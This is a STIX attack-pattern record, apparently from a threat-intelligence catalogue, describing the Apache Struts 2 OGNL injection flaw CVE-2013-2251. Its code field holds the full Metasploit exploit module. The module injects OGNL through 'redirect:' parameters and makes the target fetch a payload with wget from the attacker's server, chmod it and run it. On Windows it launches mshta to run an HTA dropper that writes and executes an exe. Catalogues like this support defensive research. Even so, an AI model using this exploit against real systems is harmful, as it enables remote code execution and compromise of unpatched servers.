{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6d00dae3-86e0-4b5d-a7a5-824b8ead715f",
    "created": "2024-08-14T17:08:14.345771Z",
    "modified": "2024-08-14T17:08:14.345775Z",
    "name": "Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution",
    "description": " The Struts 2 DefaultActionMapper supports a method for short-circuit navigation state changes by prefixing parameters with \"action:\" or \"redirect:\", followed by a desired navigational target expression. This mechanism was intended to help with attaching navigational information to buttons within forms.  In Struts 2 before 2.3.15.1 the information following \"action:\", \"redirect:\" or \"redirectAction:\" is not properly sanitized. Since said information will be evaluated as OGNL expression against the value stack, this introduces the possibility to inject server side code.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/struts_default_action_mapper.rb",
            "external_id": "struts_default_action_mapper.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2251"
        },
        {
            "source_name": "reference",
            "url": "http://struts.apache.org/release/2.3.x/docs/s2-016.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution',\n        'Description' => %q{\n          The Struts 2 DefaultActionMapper supports a method for short-circuit navigation\n          state changes by prefixing parameters with \"action:\" or \"redirect:\", followed by\n          a desired navigational target expression. This mechanism was intended to help with\n          attaching navigational information to buttons within forms.\n\n          In Struts 2 before 2.3.15.1 the information following \"action:\", \"redirect:\" or\n          \"redirectAction:\" is not properly sanitized. Since said information will be\n          evaluated as OGNL expression against the value stack, this introduces the\n          possibility to inject server side code.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Takeshi Terada', # Vulnerability discovery\n          'sinn3r',         # Metasploit module\n          'juan vazquez'    # Metasploit modules\n        ],\n        'References' => [\n          [ 'CVE', '2013-2251' ],\n          [ 'OSVDB', '95405' ],\n          [ 'BID', '61189' ],\n          [ 'URL', 'http://struts.apache.org/release/2.3.x/docs/s2-016.html' ]\n        ],\n        'Platform' => %w{linux win},\n        'Targets' => [\n          ['Automatic', {}],\n          [\n            'Windows',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ],\n          [\n            'Linux',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n        'DefaultOptions' => {\n          'WfsDelay' => 10\n        },\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        'DisclosureDate' => '2013-07-02',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'Action URI', '/struts2-blank/example/HelloWorld.action']),\n        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the payload request', 60]),\n        OptInt.new('PAYLOAD_REQUEST_DELAY', [true, 'Time to wait for the payload request', 5]),\n        # It isn't OptPath becuase it's a *remote* path\n        OptString.new(\"WritableDir\", [ true, \"A directory where we can write files (only on Linux targets)\", \"/tmp\" ])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def on_new_session(session)\n    if session.type == \"meterpreter\"\n      session.core.use(\"stdapi\") unless session.ext.aliases.include?(\"stdapi\")\n    end\n\n    @dropped_files.delete_if do |file|\n      false unless file =~ /\\.exe/\n      win_file = file.gsub(\"/\", \"\\\\\\\\\")\n      if session.type == \"meterpreter\"\n        begin\n          wintemp = session.sys.config.getenv('TEMP')\n          win_file = \"#{wintemp}\\\\#{win_file}\"\n          session.shell_command_token(%Q|attrib.exe -r \"#{win_file}\"|)\n          session.fs.file.rm(win_file)\n          print_good(\"Deleted #{file}\")\n          true\n        rescue ::Rex::Post::Meterpreter::RequestError\n          print_error(\"Failed to delete #{win_file}\")\n          false\n        end\n      end\n    end\n\n    super\n  end\n\n  def start_http_service\n    # do not use SSL for this part\n    # XXX: See https://github.com/rapid7/metasploit-framework/issues/3853\n    # It must be possible to do this without directly editing the\n    # datastore.\n    if datastore['SSL']\n      ssl_restore = true\n      datastore['SSL'] = false\n    end\n\n    if (datastore['SRVHOST'] == \"0.0.0.0\" or datastore['SRVHOST'] == \"::\")\n      srv_host = Rex::Socket.source_address(rhost)\n    else\n      srv_host = datastore['SRVHOST']\n    end\n\n    service_url = srv_host + ':' + datastore['SRVPORT'].to_s\n    print_status(\"#{rhost}:#{rport} - Starting up our web service on #{service_url} ...\")\n    start_service({\n      'Uri' => {\n        'Proc' => Proc.new { |cli, req|\n          on_request_uri(cli, req)\n        },\n        'Path' => '/'\n      }\n    })\n\n    # Restore SSL preference\n    # XXX: See https://github.com/rapid7/metasploit-framework/issues/3853\n    # It must be possible to do this without directly editing the\n    # datastore.\n    datastore['SSL'] = true if ssl_restore\n\n    return service_url\n  end\n\n  def check\n    uri = normalize_uri(target_uri.path)\n    res = send_request_cgi({\n      'uri' => uri,\n      'method' => 'GET'\n    })\n\n    if res.nil? or res.code != 200\n      vprint_error(\"#{rhost}:#{rport} - Check needs a valid action, returning 200, as TARGETURI\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    proof = rand_text_alpha(6 + rand(4))\n\n    res = send_request_cgi({\n      'uri' => \"#{uri}?redirect:%24{new%20java.lang.String('#{proof}')}\",\n      'method' => 'GET'\n    })\n\n    if res and res.code == 302 and res.headers['Location'] =~ /#{proof}/ and res.headers['Location'] !~ /String/\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def auto_target\n    uri = normalize_uri(target_uri.path)\n    res = send_request_cgi({\n      'uri' => uri,\n      'method' => 'GET'\n    })\n\n    if res.nil? or res.code != 200\n      fail_with(Failure::NoTarget, \"#{rhost}:#{rport} - In order to autodetect, a valid action, returning 200, must be provided as TARGETURI, returning 200\")\n    end\n\n    proof = rand_text_alpha(6 + rand(4))\n\n    res = send_request_cgi({\n      'uri' => \"#{uri}?redirect:%24{new%20java.io.File('.').getCanonicalPath().concat('#{proof}')}\",\n      'method' => 'GET'\n    })\n\n    if res and res.code == 302 and res.headers['Location'] =~ /#{proof}/\n      if res.headers['Location'] =~ /:\\\\/\n        return targets[1] # Windows\n      else\n        return targets[2] # Linux\n      end\n    end\n\n    fail_with(Failure::NoTarget, \"#{rhost}:#{rport} - Target auto-detection didn't work\")\n  end\n\n  def exploit_linux\n    downfile = rand_text_alpha(8 + rand(8))\n    @pl = @exe\n    @pl_sent = false\n\n    #\n    # start HTTP service if necessary\n    #\n    service_url = start_http_service\n\n    #\n    # download payload\n    #\n    fname = datastore['WritableDir']\n    fname = \"#{fname}/\" unless fname =~ %r'/$'\n    fname << downfile\n    uri = normalize_uri(target_uri.path)\n    uri << \"?redirect:%24{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'wget','#{service_url}','-O',new%20java.lang.String('#{fname.gsub(/\\//, \"$\")}').replace('$','\\\\u002f')})).start()}\"\n\n    print_status(\"#{rhost}:#{rport} - Downloading payload to #{fname}...\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => uri\n    })\n\n    if res.nil? or res.code != 302\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - OGNL injection failed\")\n    end\n\n    #\n    # wait for payload download\n    #\n    wait_payload\n\n    register_file_for_cleanup(fname)\n\n    #\n    # chmod\n    #\n    uri = normalize_uri(target_uri.path)\n    uri << \"?redirect:%24{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'chmod','777',new%20java.lang.String('#{fname.gsub(/\\//, \"$\")}').replace('$','\\\\u002f')})).start()}\"\n\n    print_status(\"#{rhost}:#{rport} - Make payload executable...\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => uri\n    })\n\n    if res.nil? or res.code != 302\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - OGNL injection failed\")\n    end\n\n    #\n    # execute\n    #\n    uri = normalize_uri(target_uri.path)\n    uri << \"?redirect:%24{(new%20java.lang.ProcessBuilder(new%20java.lang.String('#{fname.gsub(/\\//, \"$\")}').replace('$','\\\\u002f'))).start()}\"\n\n    print_status(\"#{rhost}:#{rport} - Execute payload...\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => uri\n    })\n\n    if res.nil? or res.code != 302\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - OGNL injection failed\")\n    end\n  end\n\n  def exploit_windows\n    @var_exename = rand_text_alpha(4 + rand(4)) + '.exe'\n    @pl = build_hta\n    @pl_sent = false\n\n    #\n    # start HTTP service if necessary\n    #\n    service_url = start_http_service\n\n    #\n    # execute hta\n    #\n    uri = normalize_uri(target_uri.path)\n    uri << \"?redirect:%24{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'mshta',new%20java.lang.String('http:nn#{service_url}').replace('n','\\\\u002f')})).start()}\"\n\n    print_status(\"#{rhost}:#{rport} - Execute payload through malicious HTA...\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => uri\n    })\n\n    if res.nil? or res.code != 302\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - OGNL injection failed\")\n    end\n\n    #\n    # wait for payload download\n    #\n    wait_payload\n\n    register_file_for_cleanup(@var_exename)\n  end\n\n  def exploit\n    if target.name =~ /Automatic/\n      print_status(\"#{rhost}:#{rport} - Target autodetection...\")\n      my_target = auto_target\n      print_good(\"#{rhost}:#{rport} - #{my_target.name} target found!\")\n    else\n      my_target = target\n    end\n\n    p = exploit_regenerate_payload(my_target.platform, my_target.arch)\n    @exe = generate_payload_exe({ :code => p.encoded, :platform => my_target.platform, :arch => my_target.arch })\n\n    if my_target.name =~ /Linux/\n      if datastore['PAYLOAD'] =~ /windows/\n        fail_with(Failure::BadConfig, \"#{rhost}:#{rport} - The target is Linux, but you've selected a Windows payload!\")\n      end\n      exploit_linux\n    elsif my_target.name =~ /Windows/\n      if datastore['PAYLOAD'] =~ /linux/\n        fail_with(Failure::BadConfig, \"#{rhost}:#{rport} - The target is Windows, but you've selected a Linux payload!\")\n      end\n      exploit_windows\n    end\n  end\n\n  # Handle incoming requests from the server\n  def on_request_uri(cli, request)\n    vprint_status(\"#{rhost}:#{rport} - URI requested: #{request.inspect}\")\n    if (not @pl)\n      print_error(\"#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!\")\n      return\n    end\n    print_status(\"#{rhost}:#{rport} - Sending the payload to the server...\")\n    @pl_sent = true\n    send_response(cli, @pl)\n  end\n\n  def autofilter\n    true\n  end\n\n  # wait for the data to be sent\n  def wait_payload\n    print_status(\"#{rhost}:#{rport} - Waiting for the victim to request the payload...\")\n\n    waited = 0\n    while (not @pl_sent)\n      select(nil, nil, nil, 1)\n      waited += 1\n      if (waited > datastore['HTTP_DELAY'])\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Target didn't request request the ELF payload -- Maybe it cant connect back to us?\")\n      end\n    end\n\n    sleep(datastore['PAYLOAD_REQUEST_DELAY'])\n  end\n\n  def build_hta\n    var_shellobj\t= rand_text_alpha(rand(5) + 5);\n    var_fsobj = rand_text_alpha(rand(5) + 5);\n    var_fsobj_file\t= rand_text_alpha(rand(5) + 5);\n    var_vbsname = rand_text_alpha(rand(5) + 5);\n    var_writedir\t= rand_text_alpha(rand(5) + 5);\n\n    var_origLoc = rand_text_alpha(rand(5) + 5);\n    var_byteArray\t= rand_text_alpha(rand(5) + 5);\n    var_writestream\t= rand_text_alpha(rand(5) + 5);\n    var_strmConv\t= rand_text_alpha(rand(5) + 5);\n\n    # Doing in this way to bypass the ADODB.Stream restrictions on JS,\n    # even when executing it as an \"HTA\" application\n    # The encoding code has been stolen from ie_unsafe_scripting.rb\n    print_status(\"#{rhost}:#{rport} - Encoding payload into vbs/javascript/hta...\");\n\n    # Build the content that will end up in the .vbs file\n    vbs_content\t= Rex::Text.to_hex(%Q|\nDim #{var_origLoc}, s, #{var_byteArray}\n#{var_origLoc} = SetLocale(1033)\n|)\n    # Drop the exe payload into an ansi string (ansi ensured via SetLocale above)\n    # for conversion with ADODB.Stream\n    vbs_ary = []\n    # The output of this loop needs to be as small as possible since it\n    # gets repeated for every byte of the executable, ballooning it by a\n    # factor of about 80k (the current size of the exe template).  In its\n    # current form, it's down to about 4MB on the wire\n    @exe.each_byte do |b|\n      vbs_ary << Rex::Text.to_hex(\"s=s&Chr(#{(\"%d\" % b)})\\n\")\n    end\n    vbs_content << vbs_ary.join(\"\")\n\n    # Continue with the rest of the vbs file;\n    # Use ADODB.Stream to convert from an ansi string to it's byteArray equivalent\n    # Then use ADODB.Stream again to write the binary to file.\n    # print_status(\"Finishing vbs...\");\n    vbs_content << Rex::Text.to_hex(%Q|\nDim #{var_strmConv}, #{var_writedir}, #{var_writestream}\n#{var_writedir} = WScript.CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\") & \"\\\\#{@var_exename}\"\n\nSet #{var_strmConv} = CreateObject(\"ADODB.Stream\")\n\n#{var_strmConv}.Type = 2\n#{var_strmConv}.Charset = \"x-ansi\"\n#{var_strmConv}.Open\n#{var_strmConv}.WriteText s, 0\n#{var_strmConv}.Position = 0\n#{var_strmConv}.Type = 1\n#{var_strmConv}.SaveToFile #{var_writedir}, 2\n\nSetLocale(#{var_origLoc})|)\n\n    hta = <<-EOS\n      <script>\n      var #{var_shellobj} = new ActiveXObject(\"WScript.Shell\");\n      var #{var_fsobj}    = new ActiveXObject(\"Scripting.FileSystemObject\");\n      var #{var_writedir} = #{var_shellobj}.ExpandEnvironmentStrings(\"%TEMP%\");\n      var #{var_fsobj_file} = #{var_fsobj}.OpenTextFile(#{var_writedir} + \"\\\\\\\\\" + \"#{var_vbsname}.vbs\",2,true);\n\n      #{var_fsobj_file}.Write(unescape(\"#{vbs_content}\"));\n      #{var_fsobj_file}.Close();\n\n      #{var_shellobj}.run(\"wscript.exe \" + #{var_writedir} + \"\\\\\\\\\" + \"#{var_vbsname}.vbs\", 1, true);\n      #{var_shellobj}.run(#{var_writedir} + \"\\\\\\\\\" + \"#{@var_exename}\", 0, false);\n      #{var_fsobj}.DeleteFile(#{var_writedir} + \"\\\\\\\\\" + \"#{var_vbsname}.vbs\");\n      window.close();\n      </script>\n    EOS\n\n    return hta\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2013-07-02",
    "x_mitre_platforms": [
        "linux"
    ]
}